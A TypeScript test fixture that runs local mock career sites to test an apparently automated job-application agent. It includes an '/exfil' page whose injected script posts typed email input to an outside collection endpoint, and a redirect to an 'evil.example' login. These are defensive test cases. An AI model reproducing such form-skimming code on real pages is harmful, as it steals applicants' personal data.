import { createHash } from "node:crypto";
import { createServer, type IncomingMessage, type ServerResponse } from "node:http";

export interface FixtureSubmission {
  path: string;
  fields: Record<string, string>;
  resume: { filename: string; mime: string; bytes: Buffer; sha256: string } | null;
}
export interface CareerFixtures {
  baseUrl: string;
  atsUrl: string;
  close(): Promise<void>;
  submissions: FixtureSubmission[];
  readonly loginCount: number;
  readonly exfilCount: number;
  readonly unknownVisits: number;
  readonly applyScriptVisits: number;
  resolveChallenge(): void;
  resolveMfa(): void;
  resolveUnknownAnswer(value: string): void;
}
const page = (res: ServerResponse, html: string) => { res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" }); res.end(`<!doctype html><html><body>${html}</body></html>`); };
const read = async (req: IncomingMessage): Promise<Buffer> => {
  const chunks: Buffer[] = [];
  for await (const chunk of req) chunks.push(Buffer.from(chunk));
  return Buffer.concat(chunks);
};
function parseSubmission(req: IncomingMessage, body: Buffer, path: string): FixtureSubmission {
  const fields: Record<string, string> = {};
  let resume: FixtureSubmission["resume"] = null;
  const boundary = /boundary=([^;]+)/i.exec(req.headers["content-type"] || "")?.[1];
  if (boundary) {
    const raw = body.toString("latin1");
    for (const part of raw.split(`--${boundary}`)) {
      const split = part.indexOf("\r\n\r\n");
      if (split < 0) continue;
      const header = part.slice(0, split);
      const name = /name="([^"]+)"/.exec(header)?.[1];
      if (!name) continue;
      const data = Buffer.from(part.slice(split + 4).replace(/\r\n$/, ""), "latin1");
      const filename = /filename="([^"]+)"/.exec(header)?.[1];
      if (filename) resume = { filename, mime: /Content-Type:\s*([^\r\n]+)/i.exec(header)?.[1] || "", bytes: data, sha256: createHash("sha256").update(data).digest("hex") };
      else fields[name] = data.toString("utf8");
    }
  } else {
    for (const [k, v] of new URLSearchParams(body.toString())) fields[k] = v;
  }
  return { path, fields, resume };
}
const identity = `<label>First name <input name="firstName" required></label><label>Last name <input name="lastName" required></label><label>Email <input type="email" name="email" required></label>`;
const cv = `<label>CV <input type="file" name="resume" required></label>`;
const optional = `<label>Disability status <input name="disability" placeholder="Disability status"></label>`;
const simple = (action: string, extra = "") => `<form action="${action}" method="post" enctype="multipart/form-data">${identity}${cv}${optional}${extra}<button type="submit">Send application</button></form>`;

export async function startCareerFixtures(): Promise<CareerFixtures> {
  const submissions: FixtureSubmission[] = [];
  let loginCount = 0;
  let exfilCount = 0;
  let unknownVisits = 0;
  let applyScriptVisits = 0;
  let unknownAnswer = "";
  let challengeSolved = false;
  let mfaSolved = false;
  let atsUrl = "";
  const ats = createServer(async (req, res) => {
    const path = new URL(req.url || "/", "http://fixture.invalid").pathname;
    if (path === "/collect") { exfilCount++; await read(req); page(res, "collected"); return; }
    if (path === "/ats-apply" && !req.headers.cookie?.includes("ats=1")) { res.writeHead(302, { Location: "/ats-login" }); res.end(); return; }
    if (path === "/ats-login" && req.method === "POST") {
      const fields = new URLSearchParams((await read(req)).toString());
      if (fields.get("username") === "ats@example.test" && fields.get("password") === "ats-secret") { loginCount++; res.writeHead(303, { Location: "/ats-apply", "Set-Cookie": "ats=1; HttpOnly; SameSite=Lax; Path=/" }); res.end(); }
      else page(res, "Invalid login");
      return;
    }
    if (path === "/ats-login") { page(res, `<form action="/ats-login" method="post"><label>Username <input name="username" required></label><label>Password <input type="password" name="password" required></label><button type="submit">Sign in</button></form>`); return; }
    if (path === "/ats-apply") { page(res, simple("/submit")); return; }
    if (path === "/submit" && req.method === "POST") { submissions.push(parseSubmission(req, await read(req), path)); page(res, `<h1>Application received</h1><p>Reference: ATS-${submissions.length}</p>`); return; }
    page(res, "<h1>Not found</h1>");
  });
  await new Promise<void>(resolve => ats.listen(0, "127.0.0.1", resolve));
  const atsAddress = ats.address();
  if (!atsAddress || typeof atsAddress === "string") throw new Error("ATS fixture did not listen");
  atsUrl = `http://127.0.0.1:${atsAddress.port}`;
  const server = createServer(async (req, res) => {
    const url = new URL(req.url || "/", "http://fixture.invalid");
    const path = url.pathname;
    if (path === "/assets/application-form.js") {
      applyScriptVisits++;
      res.writeHead(200, { "Content-Type": "text/javascript; charset=utf-8" });
      // Mirrors the public ATS pattern: a job detail page's visible Apply link opens a
      // same-vendor application page whose form is hydrated by a first-party JS bundle.
      res.end(`document.querySelector('#application').innerHTML = ${JSON.stringify(simple("/submit"))};`);
      return;
    }
    if (path === "/challenge-state" || path === "/mfa-state" || path === "/unknown-answer-state") {
      res.writeHead(200, { "Content-Type": "text/plain; charset=utf-8" });
      res.end(path === "/challenge-state" ? (challengeSolved ? "solved" : "pending") : path === "/mfa-state" ? (mfaSolved ? "solved" : "pending") : unknownAnswer);
      return;
    }
    if (req.method === "POST" && path === "/login") {
      const fields = new URLSearchParams((await read(req)).toString());
      if (fields.get("username") === "applicant@example.test" && fields.get("password") === "secret-pass") {
        loginCount++;
        res.writeHead(303, { Location: "/login-apply", "Set-Cookie": "auth=1; HttpOnly; SameSite=Lax; Path=/" }); res.end();
      } else page(res, "Invalid login");
      return;
    }
    if (req.method === "POST" && path.startsWith("/submit")) {
      submissions.push(parseSubmission(req, await read(req), path));
      if (path === "/submit-slow") await new Promise(resolve => setTimeout(resolve, 3000));
      if (path === "/submit-uncertain") page(res, "<h1>Processing</h1>");
      else if (path === "/submit-false") page(res, `<p>Thank you for applying to our newsletter.</p>${simple("/submit-false")}`);
      else page(res, `<h1>Application received</h1><p>Reference: REC-${submissions.length.toString().padStart(4, "0")}</p>`);
      return;
    }
    if (req.method === "GET" && path === "/login-apply" && !req.headers.cookie?.includes("auth=1")) {
      res.writeHead(302, { Location: "/login" }); res.end(); return;
    }
    if (path === "/login") { page(res, `<form action="/login" method="post"><label>Username <input name="username" required></label><label>Password <input type="password" name="password" required></label><button type="submit">Sign in</button></form>`); return; }
    if (path === "/readonly-login") { page(res, `<form action="/login" method="post"><label>Username <input name="username" required></label><label>Password <input type="password" name="password" readonly required></label><button type="submit">Sign in</button></form>`); return; }
    if (path === "/apply-link") { page(res, `<h1>Software Engineer</h1><a href="/apply-page">Apply for this job</a>`); return; }
    if (path === "/ambiguous-apply") { page(res, `<h1>Software Engineer</h1><a href="/apply-page">Apply now</a><a href="/apply-page?source=secondary">Apply for this job</a>`); return; }
    if (path === "/apply-page") { page(res, `<h1>Application</h1><main id="application"></main><script src="/assets/application-form.js"></script>`); return; }
    if (path === "/lever-job") { page(res, `<main><h1>Product Engineer</h1><a href="/lever-job/apply">Apply for this job</a></main>`); return; }
    if (path === "/lever-job/apply") { page(res, `<main><h1>Submit your application</h1><form action="/submit" method="post" enctype="multipart/form-data"><label>Resume/CV <input type="file" name="resume" required></label><label>Full name <input name="fullName" autocomplete="name" required></label><label>Email <input type="email" name="email" required></label><label>Phone <input type="tel" name="phone" required></label><label>Current location <input name="location"></label><label>LinkedIn URL <input type="url" name="urls[LinkedIn]"></label><button type="submit">Submit application</button></form></main>`); return; }
    if (path === "/greenhouse-application") { page(res, `<main><h1>Apply for this Job</h1><form action="/submit" method="post" enctype="multipart/form-data"><label>First Name <input name="first_name" required></label><label>Last Name <input name="last_name" required></label><label>Email <input type="email" name="email" required></label><label>Phone <input type="tel" name="phone_number"></label><label>Resume/CV <input type="file" name="resume" required></label><label>Are you currently eligible to work in the United States? * <select name="custom_work_authorized" required><option value="">Select</option><option>Yes</option><option>No</option></select></label><button type="submit">Submit application</button></form></main>`); return; }
    if (path === "/simple" || path === "/login-apply" || path === "/alternate") { page(res, simple("/submit")); return; }
    if (path === "/weird-cv") { page(res, `<form action="/submit" method="post" enctype="multipart/form-data">${identity}<span id="resume-label">Upload your CV</span><input aria-labelledby="resume-label" type="file" name="attachment" required><button type="submit">Send application</button></form>`); return; }
    if (path === "/portfolio") { page(res, `<form action="/submit" method="post" enctype="multipart/form-data">${identity}<label>Portfolio document <input type="file" name="portfolio" required></label><button type="submit">Send application</button></form>`); return; }
    if (path === "/hidden-cv") { page(res, `<form action="/submit" method="post" enctype="multipart/form-data">${identity}<label>CV <input type="file" name="resume" style="display:none" required></label><button type="submit">Send application</button></form>`); return; }
    if (path === "/unknown") { unknownVisits++; page(res, simple("/submit", `<label>Work authorization <select name="workAuthorization" required><option value="">Choose</option><option>Yes</option><option>No</option></select></label><script>setInterval(()=>fetch('/unknown-answer-state').then(r=>r.text()).then(value=>{if(value)document.querySelector('[name="workAuthorization"]').value=value}),100)</script>`)); return; }
    if (path === "/select-default") { page(res, simple("/submit", `<label>Work authorization <select name="workAuthorization" required><option>Yes</option><option>No</option></select></label>`)); return; }
    if (path === "/optional-default") { page(res, simple("/submit", `<label>Disability status <select name="disabilityStatus"><option>Disabled</option><option>Not disabled</option></select></label>`)); return; }
    if (path === "/radio-authorization") { page(res, simple("/submit", `<fieldset><legend>Work authorization</legend><label><input type="radio" name="workAuthorization" value="Yes" required checked>Yes</label><label><input type="radio" name="workAuthorization" value="No" required>No</label></fieldset>`)); return; }
    if (path === "/consent") { page(res, simple("/submit", `<label>I agree to the terms <input type="checkbox" name="consent" required></label>`)); return; }
    if (path === "/challenge") { page(res, `<h1>Verify you are human</h1><div class="captcha">CAPTCHA</div>${simple("/submit")}<script>setInterval(()=>fetch('/challenge-state').then(r=>r.text()).then(s=>{if(s==='solved'){document.querySelector('.captcha')?.remove();document.querySelector('h1').textContent='Verification complete'}}),100)</script>`); return; }
    if (path === "/mfa") { page(res, `<h1>Two-factor authentication required</h1>${simple("/submit")}<script>setInterval(()=>fetch('/mfa-state').then(r=>r.text()).then(s=>{if(s==='solved')document.querySelector('h1').textContent='Authentication complete'}),100)</script>`); return; }
    if (path === "/uncertain") { page(res, simple("/submit-uncertain")); return; }
    if (path === "/slow") { await new Promise(resolve => setTimeout(resolve, 1500)); page(res, simple("/submit")); return; }
    if (path === "/slow-submit") { page(res, simple("/submit-slow")); return; }
    if (path === "/false-receipt") { page(res, `<p>Thank you for applying to our newsletter.</p>${simple("/submit-false")}`); return; }
    if (path === "/exfil") { page(res, `${simple("/submit")}<script>document.querySelector('input[name=email]').addEventListener('input', e => fetch('${atsUrl}/collect',{method:'POST',body:e.target.value}).catch(()=>{}))</script>`); return; }
    if (path === "/multi") { page(res, `<form action="/multi-2" method="get">${identity}<button type="submit">Next</button></form>`); return; }
    if (path === "/multi-2") { page(res, `<form action="/multi-recap" method="post" enctype="multipart/form-data">${cv}<label>Work authorization <select name="workAuthorization" required><option value="">Choose</option><option>Yes</option><option>No</option></select></label><button type="submit">Continue</button></form>`); return; }
    if (path === "/multi-recap") { page(res, `<h1>Review application</h1>${simple("/submit")}`); return; }
    if (path === "/bad-origin") { res.writeHead(302, { Location: "https://evil.example/login" }); res.end(); return; }
    if (path === "/ats-redirect") { res.writeHead(302, { Location: atsUrl + "/ats-apply" }); res.end(); return; }
    page(res, "<h1>Not found</h1>");
  });
  await new Promise<void>(resolve => server.listen(0, "127.0.0.1", resolve));
  const address = server.address();
  if (!address || typeof address === "string") throw new Error("Fixture server did not listen");
  return {
    baseUrl: `http://127.0.0.1:${address.port}`,
    atsUrl,
    submissions,
    get loginCount() { return loginCount; },
    get exfilCount() { return exfilCount; },
    get unknownVisits() { return unknownVisits; },
    get applyScriptVisits() { return applyScriptVisits; },
    resolveChallenge: () => { challengeSolved = true; },
    resolveMfa: () => { mfaSolved = true; },
    resolveUnknownAnswer: value => { unknownAnswer = value; },
    close: async () => { await new Promise<void>((resolve, reject) => server.close(err => err ? reject(err) : resolve())); await new Promise<void>((resolve, reject) => ats.close(err => err ? reject(err) : resolve())); },
  };
}
